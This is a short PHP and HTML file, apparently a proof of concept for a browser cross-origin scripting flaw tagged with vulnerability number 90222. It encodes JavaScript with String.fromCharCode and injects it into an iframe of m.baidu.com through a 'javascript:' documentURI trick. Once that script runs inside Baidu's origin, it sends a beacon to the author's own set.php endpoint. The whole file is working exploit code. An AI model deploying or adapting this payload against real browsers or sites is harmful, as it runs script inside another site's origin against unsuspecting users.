<?php
    //漏洞编号90222
    include "../config/config.php";

    $code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
    $setPhp = $DOMAIN."/php/set.php?code=".$code."&suc=6";
    $str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='".$setPhp."';}}";
    // $str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='./php/set.php?code=".$code."&suc=6';}}";

    $tmp = str_split($str);
    $result = array();

    foreach($tmp as $key => $value){
        $result[$key] = ord($value);
    }

    $input = implode(",", $result);

?>

<body>
    <script>
        loadIframe = document.body.appendChild(document.createElement("iframe"));
        loadIframe.src = "http://m.baidu.com";
        loadIframe.onload = function() {
            document.documentURI = "javascript://hostname.com/%0D%0Aeval(String.fromCharCode(<?php echo $input; ?>))";
            loadIframe.contentWindow.location = "";
        }
    </script>
</body>